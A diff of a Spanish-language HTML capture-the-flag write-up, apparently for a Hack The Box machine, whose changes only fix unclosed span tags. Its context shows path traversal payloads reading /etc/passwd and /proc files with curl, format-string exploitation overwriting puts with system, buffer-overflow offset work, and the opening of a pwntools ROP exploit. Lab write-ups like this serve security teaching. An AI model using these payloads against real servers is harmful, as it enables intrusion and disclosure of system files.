@@ -56,7 +56,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="code-dark-green">/./././././././././././etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 562ms]</span>
 <span class="code-dark-green">/../../../../../../../../../../etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 577ms]</span>
 <span class="code-dark-green">/../../../../../../../../../../../etc/passwd%00.html [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 577ms]</span>
-<span class="code-dark-green">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 79ms]  
+<span class="code-dark-green">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 79ms]</span>  
 </code></pre></div><p>Vaya, eso era inesperado.</p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Entonces, podemos leer <code>/etc/passwd</code> (realmente, solamente tenemos que agregar la ruta a la URL):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -93,7 +93,7 @@ john:x:1001:1001:,,,:/home/john:/bin/bash
 <span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//etc/passwd -s | <span class="code-dark-green">grep</span> sh$
 root:x:0:0:root:/root:/bin/ba<span class="code-red">sh</span>
 r4j:x:1000:1000:r4j:/home/r4j:/bin/ba<span class="code-red">sh</span>
-john:x:1001:1001:,,,:/home/john:/bin/ba<span class="code-red">sh
+john:x:1001:1001:,,,:/home/john:/bin/ba<span class="code-red">sh</span>
 </code></pre></div><p>Perfecto, hay tres usuarios disponibles en la máquina: <code>root</code>, <code>r4j</code> y <code>john</code>.</p><h3 id="explotación-de-_directory-path-traversal_">Explotación de <em>Directory Path Traversal</em></h3><p>En este punto, vamos a enumerar la tecnología que está detrás del servidor web. Podemos extraer esta información mirando en <code>/proc/self/cmdline</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/cmdline -vso -
 *   Trying 10.10.10.148:9999...
 * Connected to 10.10.10.148 (10.10.10.148) port 9999 (#0)
@@ -411,7 +411,7 @@ _=./httpserver
     RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
     Stack:    <span class="code-dark-green">Canary found</span>
     NX:       <span class="code-dark-green">NX enabled</span>
-    PIE:      <span class="code-dark-green">PIE enabled
+    PIE:      <span class="code-dark-green">PIE enabled</span>
 </code></pre></div><p>Por tanto, para calcular una dirección de una función en tiempo de ejecución, tenemos que usar una dirección base y el correspondiente <em>offset</em> (ya sea del binario o de Glibc), ya que ASLR está habilitado en la máquina (aparece un <code>2</code> en <code>/proc/sys/kernel/randomize_va_space</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/sys/kernel/randomize_va_space -H <span class="code-dark-yellow">'Range: bytes=0-1000000'</span> -so -  
 2
 </code></pre></div><h3 id="explotación-de-_format-string_">Explotación de <em>Format String</em></h3><p>Vamos a ejecutar el binario en local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./httpserver</span>
@@ -582,7 +582,7 @@ Error in re-setting breakpoint 1: No symbol "log_access" in current context.
 Error in re-setting breakpoint 1: No symbol "log_access" in current context.
 [Inferior 3 (process 206427) exited normally]
 </code></pre></div><p>¡Ahí está! Ahora <code>puts</code> es <code>system</code>. Recordemos la siguiente porción de código de la función <code>log_access</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">log_access</span><span class="mtk1">(undefined4 </span><span class="mtk9 mtki">param_1</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_2</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">param_3</span><span class="mtk1">) {</span>  
-<span class="mtk1">  </span><span class="mtk3">// ...
+<span class="mtk1">  </span><span class="mtk3">// ...</span>
 
 <span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">:</span><span class="mtk6">%d</span><span class="mtk4"> </span><span class="mtk6">%d</span><span class="mtk4"> - "</span><span class="mtk1">, pcVar3, (</span><span class="mtk7 mtki">uint</span><span class="mtk1">) uVar2,param_1);</span>
 <span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(param_3);</span>
@@ -590,7 +590,7 @@ Error in re-setting breakpoint 1: No symbol "log_access" in current context.
 <span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"request method:"</span><span class="mtk1">);</span>
 <span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(param_3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">);</span>
 
-<span class="mtk1">  </span><span class="mtk3">// ...
+<span class="mtk1">  </span><span class="mtk3">// ...</span>
 
 <span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
 <span class="mtk1">}</span>
@@ -927,7 +927,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
     RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
     Stack:    <span class="code-dark-green">Canary found</span>
     NX:       <span class="code-dark-green">NX enabled</span>
-    PIE:      <span class="code-dark-green">PIE enabled
+    PIE:      <span class="code-dark-green">PIE enabled</span>
 </code></pre></div><p>En Ghidra, vemos la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
 <span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
 <span class="mtk1">  </span><span class="mtk7 mtki">socklen_t</span><span class="mtk1"> local_40;</span>
@@ -1035,9 +1035,9 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 <span class="code-yellow">unstripping libc</span>
 <span class="code-green">https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_amd64.deb</span>  
-<span class="code-dark-green">setting <span class="code-green">ld-linux-x86-64.so.2<span class="code-dark-green"> executable</span>
-<span class="code-dark-green">copying <span class="code-green">contact<span class="code-dark-green"> to <span class="code-green">contact_patched</span>
-<span class="code-dark-green">running patchelf on <span class="code-green">contact_patched
+<span class="code-dark-green">setting <span class="code-green">ld-linux-x86-64.so.2<span class="code-dark-green"> executable</span></span></span>
+<span class="code-dark-green">copying <span class="code-green">contact<span class="code-dark-green"> to <span class="code-green">contact_patched</span></span></span></span>
+<span class="code-dark-green">running patchelf on <span class="code-green">contact_patched</span></span>
 </code></pre></div><p>Ahora tenemos <code>contact_patched</code>, que se comportará de manera igual al binario remoto.</p><p>Vamos a comenzar por obtener el número de bytes necesarios para acontecer la vulnerabilidad de <em>Buffer Overflow</em>. Una manera de hacer esto es matemáticamente (como <code>local_48</code> tiene 56 bytes asignados, significa que los siguientes 8 bytes serán para el canario de la pila, luego el valor guardado de <code>$rbp</code> y luego el valor guardado de <code>$rip</code> o dirección de retorno).</p><p>Vamos a probarlo. Si introducimos exactamente 56 byte, todo está OK:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'import os; os.write(1, b"A" * 56)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1337  
 Please enter the message you want to send to admin:
 Done.
@@ -1191,7 +1191,7 @@ listen on port 1337, fd is 3
 0000000000004050 R_X86_64_JUMP_SLOT  <span class="code-red">send</span>@GLIBC_2.2.5
 </code></pre></div><ul><li><code>write</code> en la PLT (<em>offset</em> <code>0x1050</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">contact</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'&lt;write@plt&gt;'</span>
 0000000000001050 <span class="code-red">&lt;write@plt&gt;</span>:
-    154e:       e8 fd fa ff ff          call   1050 <span class="code-red">&lt;write@plt&gt;  
+    154e:       e8 fd fa ff ff          call   1050 <span class="code-red">&lt;write@plt&gt;</span>  
 </code></pre></div><p>Todos los valores anteriores se pueden usar para desarrollar el <em>exploit</em> de forma más manual. Esta vez, usaré las funciones de <a target="_blank" href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>, porque sabemos lo que estamos haciendo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">rop</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ROP</span><span class="mtk1">(</span>elf<span class="mtk1">)</span>
 <span class="mtk1">    </span><span class="mtk1">socket_fd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">4</span>
 
